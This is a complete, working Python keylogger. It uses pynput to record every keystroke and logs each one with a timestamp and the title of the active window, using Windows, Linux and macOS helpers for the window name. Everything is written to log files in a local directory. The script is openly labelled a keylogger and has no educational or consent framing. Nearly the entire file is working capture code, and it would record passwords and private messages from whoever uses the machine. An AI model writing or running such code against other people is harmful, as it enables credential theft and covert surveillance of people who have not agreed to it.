import os
import sys
import time
import logging
import platform
import subprocess
from datetime import datetime
from pynput import keyboard

# Set up logs directory
if not os.path.exists("logs"):
    os.makedirs("logs")

log_filename = datetime.now().strftime("logs/log_%Y-%m-%d_%H-%M-%S.txt")
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(message)s')

current_window = None
system_platform = platform.system()

# Platform-specific imports (only when needed)
if system_platform == "Windows":
    try:
        import win32gui
    except ImportError:
        print("win32gui not found. Install it with: pip install pywin32")
        sys.exit(1)

def get_active_window():
    global system_platform
    try:
        if system_platform == "Windows":
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())

        elif system_platform == "Linux":
            # Requires xdotool: sudo apt install xdotool
            window = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"])
            return window.decode('utf-8').strip()

        elif system_platform == "Darwin":  # macOS
            # Uses AppleScript to get frontmost app
            script = 'tell application "System Events" to get name of (processes where frontmost is true)'
            window = subprocess.check_output(["osascript", "-e", script])
            return window.decode('utf-8').strip()

    except Exception as e:
        return f"Unknown Window ({e})"

def on_press(key):
    global current_window
    window_title = get_active_window()

    if window_title != current_window:
        current_window = window_title
        logging.info(f"\n\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] - Window: {current_window}")

    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
